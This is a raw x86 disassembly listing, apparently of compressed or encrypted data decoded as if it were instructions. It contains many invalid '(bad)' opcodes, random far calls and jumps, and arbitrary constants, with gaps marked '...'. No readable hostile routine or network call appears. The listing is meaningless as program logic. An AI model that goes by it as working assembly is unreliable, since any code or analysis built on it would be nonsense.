  418b0d:	ficom  DWORD PTR [ebx]
  418b0f:	rcr    DWORD PTR [eax+0x37],1
  418b12:	push   ds
  418b13:	dec    edi
  418b14:	dec    esp
  418b15:	adc    BYTE PTR [eax],0x43
  418b18:	xchg   edi,eax
  418b19:	shl    BYTE PTR [esi+0x58],cl
  418b1c:	mov    dh,0xe0
  418b1e:	mov    DWORD PTR [ebx],edi
  418b20:	sub    BYTE PTR [edx],bl
  418b22:	out    0xce,al
  418b24:	mov    ebx,0x23215edd
  418b29:	aaa    
  418b2a:	push   0xffffffd5
  418b2c:	inc    esp
  418b2d:	sti    
  418b2e:	iret   
  418b2f:	jecxz  0x418b7a
  418b31:	adc    edi,edx
  418b33:	cld    
  418b34:	aaa    
  418b35:	mov    al,ds:0xf37fd37d
  418b3a:	popa   
  418b3b:	push   0x27a6b80
  418b40:	(bad)  
  418b41:	adc    al,0xbb
  418b43:	xchg   ebp,eax
  418b44:	test   al,0xfb
  418b46:	arpl   WORD PTR [ecx-0x5d75ca64],bp
  418b4c:	(bad)  
  418b4d:	neg    ebp
  418b4f:	pop    ebx
  418b50:	frstor [ebx]
  418b52:	mov    DWORD PTR [esi-0x12],ecx
  418b55:	dec    esi
  418b56:	jp     0x418b52
  418b58:	out    dx,al
  418b59:	les    ebx,FWORD PTR [edx-0x726133ce]
  418b5f:	push   edx
  418b60:	pusha  
  418b61:	inc    esi
  418b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b63:	push   es
  418b64:	mov    edi,0x6a54815d
  418b69:	ss mul cl
  418b6c:	push   0xffffffc7
	...
  418bd6:	jl     0x418beb
  418bd8:	test   DWORD PTR [edx],esi
  418bda:	out    dx,eax
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0xee
  418be3:	mov    edi,0xa676d80
  418be8:	add    DWORD PTR [eax],eax
  418bea:	add    BYTE PTR [ecx],al
  418bec:	add    BYTE PTR [eax],al
  418bee:	dec    eax
  418bef:	add    DWORD PTR [eax-0x59],esi
  418bf2:	lds    edi,FWORD PTR [edx+0x742a0a18]
  418bf8:	test   al,0x67
  418bfa:	ds jmp 0xf0ea4b1d
  418c00:	(bad)  
  418c01:	mov    ecx,0xd8416f7d
  418c06:	ja     0x418bf9
  418c08:	pop    edi
  418c09:	xchg   ecx,eax
  418c0a:	mov    esi,0x2d7c89fa
  418c0f:	aad    0xd7
  418c11:	inc    eax
  418c12:	mov    al,ds:0x2e8e9ca6
  418c17:	jl     0x418c91
  418c19:	scas   eax,DWORD PTR es:[edi]
  418c1a:	mov    ah,0xb8
  418c1c:	(bad)  
  418c1d:	pop    edx
  418c1e:	or     BYTE PTR [bx+si],cl
  418c21:	lahf   
  418c22:	cmp    eax,esi
  418c24:	call   0x1e5a:0xe63f95cb
  418c2b:	retf   
  418c2c:	sub    ah,BYTE PTR [esi+0x2a964a7f]
  418c32:	retf   0x207e
  418c35:	xchg   ebx,eax
  418c36:	xor    ecx,DWORD PTR [edi]
  418c38:	or     cl,BYTE PTR [edx+esi*4-0x5b]
  418c3c:	lahf   
  418c3d:	mov    ch,BYTE PTR [ebx]
  418c3f:	inc    ebx
  418c40:	ins    DWORD PTR es:[edi],dx
  418c41:	sub    BYTE PTR [eax+0x49],0xdf
  418c45:	(bad)  
  418c47:	xor    dl,dl
  418c49:	push   esp
  418c4a:	cmc    
  418c4b:	push   esp
  418c4c:	in     eax,dx
  418c4d:	pop    ebp
  418c4e:	inc    ecx
  418c4f:	xor    DWORD PTR [esi+ecx*1-0x1f],ebp
  418c53:	xchg   esi,eax
  418c54:	pop    DWORD PTR [esi-0x4341edfe]
  418c5a:	xchg   ebx,eax
  418c5b:	fdivr  st,st(5)
  418c5d:	popa   
  418c5e:	repnz (bad) 
  418c60:	test   BYTE PTR [eax+eax*8+0x7c438fef],0x2e
  418c68:	leave  
  418c69:	sub    eax,DWORD PTR [esi-0x13]
  418c6c:	cwde   
  418c6d:	inc    ebp
  418c6e:	(bad)  
  418c6f:	out    0x18,eax
  418c71:	dec    ebp
  418c72:	mov    ecx,0x8f7dce5
  418c77:	fidiv  DWORD PTR [ebx+0x1c]
  418c7a:	mov    al,ds:0xa4507c7c
  418c7f:	pop    ds
  418c80:	repz loope 0x418c82
  418c83:	je     0x418c1c
  418c85:	or     esi,DWORD PTR [ebp+0x58]
  418c88:	bound  esi,QWORD PTR [edi]
  418c8a:	or     al,0xd
  418c8c:	push   ebp
  418c8d:	out    dx,eax
  418c8e:	dec    edx
  418c8f:	mov    bh,0xe5
  418c91:	push   esi
  418c92:	mov    bl,BYTE PTR [ecx]
  418c94:	loope  0x418c60
  418c96:	ret    
  418c97:	adc    eax,DWORD PTR [esi]
  418c99:	lods   al,BYTE PTR ds:[esi]
  418c9a:	mov    edi,edi
  418c9c:	dec    esp
  418c9d:	pop    edi
  418c9e:	lahf   
  418c9f:	fbld   TBYTE PTR [esi-0x3d7f4b13]
  418ca5:	mov    esp,DWORD PTR [edi]
  418ca7:	int    0x45
  418ca9:	dec    ebp
  418caa:	out    0x49,al
  418cac:	add    eax,0xab75b041
  418cb1:	cmp    al,0xe5
  418cb3:	add    esi,DWORD PTR [ecx+edx*8+0xb3eedf8]
  418cba:	jg     0x418c4c
  418cbc:	sar    DWORD PTR [eax+0x60c2e7b4],cl
  418cc2:	push   ss
  418cc3:	inc    esp
  418cc4:	jb     0x418ce8
  418cc6:	and    eax,0x21f0c1f3
  418ccb:	sti    
  418ccc:	adc    ebx,edx
  418cce:	fidivr WORD PTR [eax-0x6a]
  418cd1:	cwde   
  418cd2:	jae    0x418ce3
  418cd4:	(bad)  
  418cd5:	mov    dl,0x43
  418cd7:	push   0xdd24e869
  418cdc:	jle    0x418ca3
  418cde:	sub    DWORD PTR [ebx],edx
  418ce0:	test   al,0x17
  418ce2:	std    
  418ce3:	jle    0x418d30
  418ce5:	popa   
  418ce6:	jns    0x418d11
  418ce8:	or     ebp,DWORD PTR [edi+0x614d738b]
	...
  418d56:	sti    
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	shr    BYTE PTR [edx],cl
  418d63:	mov    dl,0x3a
  418d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d66:	or     eax,DWORD PTR [bx+di]
  418d69:	add    BYTE PTR [eax],al
  418d6b:	add    DWORD PTR [eax],eax
  418d6d:	add    BYTE PTR [edx-0x501d2cd6],dl
  418d73:	adc    eax,edx
  418d75:	int    0x24
  418d77:	popa   
  418d78:	pop    ebx
  418d79:	pop    ebp
  418d7a:	jl     0x418d1d
  418d7c:	xor    al,0xd0
  418d7e:	out    0xc4,eax
  418d80:	inc    ecx
  418d81:	imul   ebx,DWORD PTR [edx-0x20],0xffffffc8
  418d85:	add    eax,0x4c82909c
  418d8a:	dec    edi
  418d8b:	cmp    ebx,DWORD PTR [edi]
  418d8d:	sub    eax,0xe49cf680
  418d92:	jge    0x418daf
  418d94:	xor    al,0x8
  418d96:	in     al,dx
  418d97:	pop    DWORD PTR [ecx+0x57]
  418d9a:	push   cs
  418d9b:	add    ebx,0x0
  418d9e:	or     DWORD PTR [ebx-0x1dc15892],esi
  418da4:	(bad)  [edx+0x74]
  418da7:	xchg   esp,eax
  418da8:	push   0xa251d9eb
  418dad:	add    BYTE PTR [si],bl
  418db0:	xor    DWORD PTR [eax],esi
  418db2:	iret   
  418db3:	rcr    eax,0xbd
  418db6:	push   edi
  418db7:	xchg   ebx,eax
  418db8:	iret   
  418db9:	jmp    0x8642e3b1
  418dbe:	jmp    0xb83a:0x10d86b4f
  418dc5:	cmp    esp,DWORD PTR [edx]
  418dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dc8:	ja     0x418db6
  418dca:	xchg   esi,eax
  418dcb:	cwde   
  418dcc:	xchg   ebp,eax
  418dcd:	xchg   ecx,eax
  418dce:	jl     0x418e40
  418dd0:	push   0x40
  418dd2:	or     cl,BYTE PTR [edx]
  418dd4:	aaa    
  418dd5:	shl    DWORD PTR [edi-0x13],cl
  418dd8:	in     al,dx
  418dd9:	retf   0x3a7d
  418ddc:	addr16 (bad) 
  418ddf:	cmc    
  418de0:	repz pop ds
  418de2:	cs clc 
  418de4:	lods   eax,DWORD PTR ds:[esi]
  418de5:	sub    al,BYTE PTR [ebx+0x4c]
  418de8:	out    dx,eax
  418de9:	xchg   ebp,eax
  418dea:	jbe    0x418e0c
  418dec:	lea    ecx,[edi]
  418dee:	mov    esi,0x81f3f1e6
  418df3:	adc    bl,bl
  418df5:	pushf  
  418df6:	repnz fbld TBYTE PTR [eax-0x58]
  418dfa:	dec    ebx
  418dfb:	xor    dh,BYTE PTR [esi]
  418dfd:	jo     0x418db4
  418dff:	jbe    0x418dea
  418e01:	push   esp
  418e02:	imul   ebx,DWORD PTR [ecx],0x5c5366a5
  418e08:	xchg   esp,eax
  418e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e0a:	outs   dx,BYTE PTR ds:[esi]
  418e0b:	mov    ah,0xe6
  418e0d:	add    eax,0x28b31db0
  418e12:	cmp    al,0xb7
  418e14:	push   ss
  418e15:	sub    BYTE PTR ds:0xa9ec83c,al
  418e1b:	test   eax,0xe0ded414
  418e20:	mov    eax,ds:0xeeff43f7
  418e25:	ficom  DWORD PTR [edi-0x3]
  418e28:	xor    dl,BYTE PTR [esi+ebx*4-0x785b19ca]
  418e2f:	test   BYTE PTR [edi],dh
  418e31:	aad    0x43
  418e33:	pop    es
  418e34:	iret   
  418e35:	repz jne 0x418de1
  418e38:	aaa    
  418e39:	mov    cl,0xb5
  418e3b:	test   al,0x2e
  418e3d:	push   0xbc84ae0b
  418e42:	sub    ebp,ebx
  418e44:	sbb    DWORD PTR [eax+0x5f],edi
  418e47:	cmp    DWORD PTR [ebp+esi*4+0x3276205f],0xffffffc5
  418e4f:	pop    ss
  418e50:	mov    cl,0xee
  418e52:	jbe    0x418dda
  418e54:	stos   BYTE PTR es:[edi],al
  418e55:	jb     0x418ebe
  418e57:	push   esp
  418e58:	pop    ss
  418e59:	xchg   edx,eax
  418e5a:	jno    0x418e12
  418e5c:	xor    esp,DWORD PTR [eax-0x29]
  418e5f:	call   0x3d01:0x7b1328c7
  418e66:	loop   0x418e6f
  418e68:	inc    ecx
  418e69:	loope  0x418e7c
  418e6b:	ins    BYTE PTR es:[edi],dx
  418e6c:	or     al,0x51
	...
  418ed6:	push   cs
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx+0x6c]
  418ee3:	retf   0xe25f
  418ee6:	addr16 or al,0x1
  418ee9:	add    BYTE PTR [eax],al
  418eeb:	add    DWORD PTR [eax],eax
  418eed:	add    BYTE PTR [esi-0x47],cl
  418ef0:	or     al,0x4b
  418ef2:	xchg   edi,eax
  418ef3:	cwde   
  418ef4:	test   al,0x4d
  418ef6:	jecxz  0x418f60
  418ef8:	xchg   esi,eax
  418ef9:	and    esi,esp
  418efb:	loope  0x418e87
  418efd:	into   
  418efe:	jle    0x418ee0
  418f00:	mov    esp,DWORD PTR [edi]
  418f02:	cmp    al,0x3
  418f04:	lea    ebp,[ecx-0x77]
  418f07:	lahf   
  418f08:	jbe    0x418f4a
  418f0a:	popf   
  418f0b:	aaa    
  418f0c:	and    eax,ebx
  418f0e:	push   0xffffffb4
  418f10:	mov    al,0x8d
  418f12:	push   0xffffffc5
  418f14:	fdivr  st(3),st
  418f16:	les    edx,FWORD PTR [edi-0x5ef09b5b]
  418f1c:	mov    WORD PTR [ebx+0x57],ds
  418f1f:	sub    cl,BYTE PTR ss:[edx+0x3c]
  418f23:	add    ch,dl
  418f25:	xlat   BYTE PTR ds:[ebx]
  418f26:	sbb    bh,0xf7
  418f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f2a:	push   es
  418f2b:	out    0x4c,al
  418f2d:	xchg   esi,eax
  418f2e:	pop    esi
  418f2f:	xchg   esi,eax
  418f30:	pushf  
  418f31:	mov    ebp,0xef8114d1
  418f36:	mov    dl,0x76
  418f38:	mov    al,ds:0x52e9f8da
  418f3d:	ss sub ebx,ecx
  418f40:	das    
  418f41:	pop    edi
  418f42:	in     al,0x58
  418f44:	test   al,0x24
  418f46:	in     eax,dx
  418f47:	jge    0x418f7a
  418f49:	push   edx
  418f4a:	pop    ebp
  418f4b:	pushf  
  418f4c:	lds    ecx,FWORD PTR [edx+0x6a371b5c]
  418f52:	jle    0x418f78
  418f54:	ret    0x6f11
  418f57:	outs   dx,BYTE PTR ds:[esi]
  418f58:	into   
  418f59:	xlat   BYTE PTR ds:[ebx]
  418f5a:	jo     0x418f76
  418f5c:	pop    ecx
  418f5d:	xchg   ebx,eax
  418f5e:	mov    al,ds:0x26b47ab4
  418f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f64:	jo     0x418f4f
  418f66:	jle    0x418f30
  418f68:	push   esi
  418f69:	sub    al,0x96
  418f6b:	les    ebx,FWORD PTR [edi+0xa]
  418f6e:	mov    eax,ds:0x6150e15
  418f73:	inc    edx
  418f74:	idiv   DWORD PTR [eax+0x6]
  418f77:	mov    bh,0xa0
  418f79:	clc    
  418f7a:	mov    edx,0x20c3142c
  418f7f:	jp     0x418f43
  418f81:	out    dx,al
  418f82:	ja     0x418f8b
  418f84:	cmp    cl,BYTE PTR [esi+ebx*4]
  418f87:	mov    ecx,0xa1197041
  418f8c:	(bad)  
  418f8d:	in     eax,0x55
  418f8f:	pop    ebx
  418f90:	mov    esp,0x83165796
  418f95:	imul   ecx,eax,0x5de06cd2
  418f9b:	inc    ebx
  418f9c:	cwde   
  418f9d:	lods   eax,DWORD PTR ds:[esi]
  418f9e:	jmp    0x6315:0xca0b5438
  418fa5:	mov    al,ds:0xda4b2cb4
  418faa:	or     bl,bh
  418fac:	ret    
  418fad:	int3   
  418fae:	cmp    al,0x7b
  418fb0:	adc    esi,DWORD PTR [eiz*2-0x727d4f25]
  418fb7:	cmp    ch,0x8b
  418fba:	mov    eax,ds:0xe0cea74f
  418fbf:	adc    al,0x93
  418fc1:	addr16 dec ecx
  418fc3:	push   esp
  418fc4:	nop
  418fc5:	aas    
  418fc6:	inc    ecx
  418fc7:	js     0x41903d
  418fc9:	(bad)  
  418fca:	sti    
  418fcb:	mov    ds:0x84c30147,eax
  418fd0:	mov    dh,0x65
  418fd2:	mov    WORD PTR [ebx],gs
  418fd4:	outs   dx,BYTE PTR ds:[esi]
  418fd5:	loope  0x419034
  418fd7:	cmc    
  418fd8:	push   ecx
  418fd9:	imul   ebp,edi,0x4814dda0
  418fdf:	jmp    0x4a158ce4
  418fe4:	into   
  418fe5:	imul   DWORD PTR [ecx]
  418fe7:	push   ss
  418fe8:	inc    ecx
  418fe9:	mov    DWORD PTR [ecx+0x56],ecx
  418fec:	mov    cl,0xa5
	...
  419056:	sbb    al,0x97
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx+0x1aeaf1a7]
  419063:	repz test DWORD PTR [edi+0x67],edi
  419067:	or     eax,0x1000001
  41906c:	add    BYTE PTR [eax],al
  41906e:	push   edi
  41906f:	fwait
  419070:	xor    DWORD PTR [ecx],eax
  419072:	(bad)  
  419073:	aaa    
  419074:	pop    eax
  419075:	adc    BYTE PTR [ebp+0x6fd08114],0x8d
  41907c:	out    0xc,al
  41907e:	push   cs
  41907f:	pop    edi
  419080:	jl     0x41906a
  419082:	sub    eax,0x9a0395a7
  419087:	and    eax,0x39dd6597
  41908c:	lods   eax,DWORD PTR ds:[esi]
  41908d:	stos   BYTE PTR es:[edi],al
  41908e:	leave  
  41908f:	mov    al,0xc
  419091:	icebp  
  419092:	or     eax,0x739b5b01
  419097:	mov    ds:0x7426d7ca,eax
  41909c:	push   edx
  41909d:	jmp    0x3f300676
  4190a2:	icebp  
  4190a3:	mov    edx,0x3bacfe88
  4190a8:	sbb    edi,DWORD PTR [ebp+0x7561f9e1]
  4190ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190af:	int    0x4a
  4190b1:	pop    ebx
  4190b2:	adc    esp,DWORD PTR [ebx-0x4958bd6]
  4190b8:	rcl    BYTE PTR [edi+ebx*8-0x49],cl
  4190bc:	xor    BYTE PTR [ebx+0x2b46c18b],ch
  4190c2:	or     esi,DWORD PTR [ebp-0x6a]
  4190c5:	jg     0x4190a3
  4190c7:	int    0x5e
  4190c9:	(bad)  
  4190ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190cb:	mov    esi,0x70bc7a46
  4190d0:	scas   eax,DWORD PTR es:[edi]
  4190d1:	fist   DWORD PTR [edx]
  4190d3:	xor    ebp,DWORD PTR [ebp-0x7097316a]
  4190d9:	push   0xf49c772
  4190de:	sti    
  4190df:	inc    edx
  4190e0:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4190e2:	xchg   edx,eax
  4190e3:	aad    0xfb
  4190e5:	imul   esi,DWORD PTR [ebx+0x73],0xa6d7e897
  4190ec:	cld    
  4190ed:	mov    ss,WORD PTR [edi+0x32]
  4190f0:	sahf   
  4190f1:	outs   dx,BYTE PTR ds:[esi]
  4190f2:	stc    
  4190f3:	jb     0x4190fa
  4190f5:	jno    0x419156
  4190f7:	lahf   
  4190f8:	or     ebp,DWORD PTR [ecx-0x268c590b]
  4190fe:	(bad)  
  419100:	mov    ebp,0x47a30c32
  419105:	jge    0x4190c4
  419107:	popa   
  419108:	inc    ebp
  419109:	sub    BYTE PTR [ecx],ch
  41910b:	aaa    
  41910c:	outs   dx,BYTE PTR ds:[esi]
  41910d:	out    0x57,al
  41910f:	pop    edx
  419110:	nop
  419111:	or     ah,bl
  419113:	xchg   edx,eax
  419114:	mov    ds:0x10c29d1,eax
  419119:	xchg   ecx,eax
  41911a:	inc    ebx
  41911b:	pop    esi
  41911c:	mov    al,ds:0xac19c856
  419121:	xor    DWORD PTR [esi-0x1da51e81],ecx
  419127:	dec    edx
  419128:	cs pop esi
  41912a:	ds cld 
  41912c:	fnstcw WORD PTR [edx+edi*4+0x53]
  419130:	popa   
  419131:	cld    
  419132:	pop    esp
  419133:	mov    eax,0x409868fb
  419138:	or     eax,0x92d4bdf9
  41913d:	icebp  
  41913e:	xchg   esp,eax
  41913f:	or     al,0xb0
  419141:	in     eax,dx
  419142:	xchg   esp,eax
  419143:	mov    eax,ds:0x3ca526ac
  419148:	xor    al,0xf1
  41914a:	push   0xffffff9c
  41914c:	enter  0x611c,0x7a
  419150:	sub    BYTE PTR [ecx],0x3
  419153:	inc    edi
  419154:	rol    DWORD PTR [ecx-0x7c1ada91],1
  41915a:	inc    esi
  41915b:	fnstsw WORD PTR [ebx-0x5d]
  41915e:	sbb    BYTE PTR [edx+0x2b7ae8dd],ah
  419164:	imul   esi,DWORD PTR [edi+esi*4],0x62bd4473
  41916b:	out    dx,eax
  41916c:	addr16 sti 
	...
  4191d6:	scas   eax,DWORD PTR es:[edi]
  4191d7:	test   DWORD PTR [esi-0xa441be],ebx
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     bl,BYTE PTR [eax]
  4191e3:	add    DWORD PTR [esi+0x10e672d],0x10000
  4191ed:	add    BYTE PTR [esi+eiz*1+0x50],bh
  4191f1:	or     esi,DWORD PTR [esi-0x66]
  4191f4:	sahf   
  4191f5:	retf   0x819c
  4191f8:	jns    0x4191c7
  4191fa:	and    esi,eax
  4191fc:	add    DWORD PTR [eax-0x6002e2dd],ebp
  419202:	lods   al,BYTE PTR ds:[esi]
  419203:	and    bl,BYTE PTR [esi]
  419205:	in     al,dx
  419206:	jg     0x419263
  419208:	jns    0x4191db
  41920a:	cmp    eax,0xd05ba654
  41920f:	dec    ecx
  419210:	inc    esp
  419211:	mov    dl,0x29
  419213:	jae    0x419271
  419215:	jns    0x419217
  419217:	or     eax,0x27712f3f
  41921c:	pop    ecx
  41921d:	ficom  DWORD PTR [ebx]
  41921f:	add    al,0xc5
  419221:	in     eax,dx
  419222:	xor    al,0x96
  419224:	outs   dx,BYTE PTR ds:[esi]
  419225:	push   esi
  419226:	(bad)  
  419227:	sbb    BYTE PTR [edi],bl
  419229:	dec    ebx
  41922a:	into   
  41922b:	sbb    ecx,DWORD PTR [ecx+0x4d740b72]
  419231:	jnp    0x41929a
  419233:	(bad)  
  419234:	xor    DWORD PTR ds:[ecx+eiz*8-0x7b],ecx
  419239:	scas   al,BYTE PTR es:[edi]
  41923a:	out    0xfc,al
  41923c:	not    DWORD PTR [eax+0x164b8da2]
  419242:	add    ah,BYTE PTR [ecx-0x26dce7c0]
  419248:	sbb    edi,0x34957778
  41924e:	dec    ebp
  41924f:	and    ch,BYTE PTR [ecx-0x35]
  419252:	aaa    
  419253:	and    eax,ecx
  419255:	xchg   edx,eax
  419256:	xchg   edi,eax
  419257:	mov    al,0xa
  419259:	or     ebx,DWORD PTR [ebx]
  41925b:	jnp    0x41924f
  41925d:	js     0x4192a5
  41925f:	cmp    eax,0x27df50d9
  419264:	push   ecx
  419265:	or     BYTE PTR [ebx+0xb4bb0f8],ah
  41926b:	fnstcw WORD PTR [eax]
  41926d:	jb     0x4192c5
  41926f:	mov    edi,0xc3b7e723
  419274:	mov    al,0x45
  419276:	imul   edx,DWORD PTR [ebx-0x59bcca70],0x6ea3ec9a
  419280:	adc    esp,DWORD PTR [ecx-0x62]
  419283:	cmp    eax,0xee09744d
  419288:	sub    edi,DWORD PTR ds:0x78aab513
  41928e:	pop    esp
  41928f:	sub    bl,ch
  419291:	mov    cl,0x9f
  419293:	jnp    0x419307
  419295:	fs pop eax
  419297:	psubw  mm6,QWORD PTR [ebx-0x4bd0e640]
  41929e:	push   es
  41929f:	adc    eax,0x1bfd392f
  4192a4:	add    eax,0x87cfce74
  4192a9:	or     eax,DWORD PTR [ebx-0x97f527f]
  4192af:	xor    ecx,ecx
  4192b1:	cmp    al,0x2
  4192b3:	pusha  
  4192b4:	jb     0x419240
  4192b6:	(bad)  
  4192b7:	(bad)  
  4192b8:	dec    esi
  4192b9:	sub    DWORD PTR [esi-0x7b],ecx
  4192bc:	or     eax,0x5e9b079
  4192c1:	popf   
  4192c2:	and    DWORD PTR [ebp+0x4e],eax
  4192c5:	(bad)  
  4192c6:	pop    ebx
  4192c7:	js     0x4192bd
  4192c9:	lds    edi,FWORD PTR [edx]
  4192cb:	mov    bh,BYTE PTR [edi]
  4192cd:	mov    bh,0xfb
  4192cf:	add    dh,al
  4192d1:	out    0xf0,eax
  4192d3:	pop    es
  4192d4:	ds aam 0x96
  4192d7:	add    ebp,0xffffffc1
  4192da:	jecxz  0x419269
  4192dc:	repz mov bl,0xe9
  4192df:	ror    eax,cl
  4192e1:	mov    ecx,0x350d5c34
  4192e6:	pop    edi
  4192e7:	add    dh,BYTE PTR [ecx+0x297375f0]
  4192ed:	push   esp
	...
  419356:	mov    al,ds:0xff33bae7
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	push   ebx
  419363:	pop    ebx
  419364:	and    DWORD PTR [esi+0x10f67],ebp
  41936a:	add    BYTE PTR [ecx],al
  41936c:	add    BYTE PTR [eax],al
  41936e:	push   ss
  41936f:	lods   eax,DWORD PTR ds:[esi]
  419370:	rol    DWORD PTR [edx-0x66a0f282],cl
  419376:	adc    BYTE PTR [eax],al
  419378:	mov    esi,0xa3b4e179
  41937d:	shl    DWORD PTR [edx+0x0],0x9
  419381:	and    ch,ah
  419383:	mov    bh,0x65
  419385:	and    DWORD PTR [ebx+ecx*4],edi
  419388:	xchg   DWORD PTR [ecx-0x4e],ebp
  41938b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41938c:	or     BYTE PTR [edi-0x7134d23b],dh
  419392:	push   edi
  419393:	sub    ebp,DWORD PTR [edi+0x9b949ab]
  419399:	data16 xchg BYTE PTR [esi-0x5a689c75],dl
  4193a0:	sbb    BYTE PTR [ebp+0x2fcf7a9f],dh
  4193a6:	call   0x7f99:0x18bb6e58
  4193ad:	push   ds
  4193ae:	or     edx,esp
  4193b0:	jmp    0x5f3d:0xb8f5ab3d
  4193b7:	and    eax,esi
  4193b9:	or     al,0xb5
  4193bb:	in     al,0x14
  4193bd:	int    0xeb
  4193bf:	xor    al,BYTE PTR [eax]
  4193c1:	mov    ah,0x16
  4193c3:	adc    al,0x7
  4193c5:	pop    ds
  4193c6:	sbb    edi,ecx
  4193c8:	dec    eax
  4193c9:	or     ebp,esi
  4193cb:	and    bl,BYTE PTR [ebp-0x5fc17a0a]
  4193d1:	or     eax,0xe71a32c
  4193d6:	inc    edi
  4193d7:	sub    al,0xcf
  4193d9:	cmp    al,0x1
  4193db:	and    al,0x5c
  4193dd:	pop    esi
  4193de:	idiv   DWORD PTR [edi]
  4193e0:	pop    esp
  4193e1:	int    0xfe
  4193e3:	out    0xf8,eax
  4193e5:	sub    esp,DWORD PTR [edx+eiz*4+0x7]
  4193e9:	cmp    edi,DWORD PTR ss:[esi-0x35]
  4193ed:	adc    eax,0x94835b04
  4193f2:	push   0xa2c9686b
  4193f7:	call   0x4f41:0x6441b15f
  4193fe:	lods   eax,DWORD PTR ds:[esi]
  4193ff:	xchg   edi,eax
  419400:	sbb    esi,DWORD PTR [eax]
  419402:	push   cs
  419403:	out    0xec,al
  419405:	lea    esi,[eax-0x6250fe60]
  41940b:	adc    esp,ecx
  41940d:	mov    ebp,DWORD PTR [edi+0x64]
  419410:	in     al,0xe7
  419412:	fnsave [esi+edx*1-0x17e819e7]
  419419:	punpckldq mm5,DWORD PTR [edx]
  41941c:	sbb    al,0x43
  41941e:	push   edx
  41941f:	fstp   TBYTE PTR [eax]
  419421:	ins    DWORD PTR es:[edi],dx
  419422:	or     BYTE PTR [edx+ebx*2+0x70fe37f1],bh
  419429:	mov    al,ds:0x8792714e
  41942e:	push   ds
  41942f:	call   0x3410:0xf1ca79b7
  419436:	fdivr  QWORD PTR [eax]
  419438:	(bad)  
  419439:	mov    esp,0x5a35afc5
  41943e:	sahf   
  41943f:	xchg   ebx,eax
  419440:	mov    ds:0x6cca7f81,al
  419445:	add    DWORD PTR [edi+edi*4+0x6d92281f],edx
  41944c:	clc    
  41944d:	test   al,0x96
  41944f:	nop
  419450:	arpl   WORD PTR ds:0xbdd7830f,bp
  419456:	dec    esi
  419457:	mov    edx,0xcaa102e3
  41945c:	mov    WORD PTR [ecx],?
  41945e:	fld    QWORD PTR [edx-0x11c2cdd5]
  419464:	in     al,dx
  419465:	pop    es
  419466:	xlat   BYTE PTR ds:[ebx]
  419467:	dec    esi
  419468:	pop    ds
  419469:	pop    ebp
  41946a:	hlt    
  41946b:	adc    bl,BYTE PTR [esi]
  41946d:	add    BYTE PTR [bx+si],al
	...
  4194d4:	add    BYTE PTR [eax],al
  4194d6:	cmp    eax,0xed3a6998
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	jnp    0x419537
  4194e4:	int    0x20
  4194e6:	adc    BYTE PTR [bx+di],al
  4194e9:	add    BYTE PTR [eax],al
  4194eb:	add    DWORD PTR [eax],eax
  4194ed:	add    BYTE PTR [edx+0x12],ah
  4194f0:	stc    
  4194f1:	or     esi,DWORD PTR [edi+0x29fc1b90]
  4194f7:	repnz stc 
  4194f9:	lds    ebx,FWORD PTR [eax]
  4194fb:	popa   
  4194fc:	jle    0x419484
  4194fe:	hlt    
  4194ff:	push   ebx
  419500:	jns    0x419542
  419502:	jecxz  0x419549
  419504:	fs add eax,0xabd3aa8
  41950a:	jecxz  0x419537
  41950c:	shl    BYTE PTR [edx+0x58ea9631],cl
  419512:	push   0x2
  419514:	pop    edi
  419515:	jbe    0x419572
  419517:	pusha  
  419518:	and    al,dl
  41951a:	daa    
  41951b:	mul    DWORD PTR [ecx]
  41951d:	jge    0x41952a
  41951f:	mov    dl,0xbb
  419521:	je     0x419527
  419523:	(bad)  
  419524:	into   
  419525:	jp     0x4195a2
  419527:	ret    
  419528:	rcr    DWORD PTR [edx],0xbd
  41952b:	retf   
  41952c:	sbb    edi,eax
  41952e:	fadd   QWORD PTR [edx-0x9db7e]
  419534:	pop    esp
  419535:	xor    eax,0x305cb69b
  41953a:	shl    DWORD PTR [esp+ebp*1+0x77],1
  41953e:	push   ebx
  41953f:	pop    eax
  419540:	call   0x2491:0x523a9e0e
  419547:	add    eax,0xd201032d
  41954c:	mov    fs,WORD PTR [edi+0x11]
  41954f:	adc    eax,0x56093cda
  419554:	dec    ecx
  419555:	scas   al,BYTE PTR es:[edi]
  419556:	fstp   DWORD PTR [esi-0x182b19d9]
  41955c:	sti    
  41955d:	push   edx
  41955e:	inc    ebx
  41955f:	dec    eax
  419560:	cli    
  419561:	rcl    DWORD PTR [edi-0x7235037b],cl
  419567:	pop    ss
  419568:	fld    QWORD PTR [edx]
  41956a:	mov    bl,0x2b
  41956c:	xchg   edx,eax
  41956d:	popf   
  41956e:	cmc    
  41956f:	add    al,0xfd
  419571:	ror    ecx,1
  419573:	into   
  419574:	mov    bl,BYTE PTR [ecx+0x3d]
  419577:	adc    ah,ch
  419579:	leave  
  41957a:	push   edi
  41957b:	xor    ebx,DWORD PTR ds:0xd5bb75b0
  419581:	fidiv  WORD PTR [ecx]
  419583:	push   edi
  419584:	xor    eax,0x54c37c13
  419589:	inc    ebp
  41958a:	pop    ss
  41958b:	lods   eax,DWORD PTR ds:[esi]
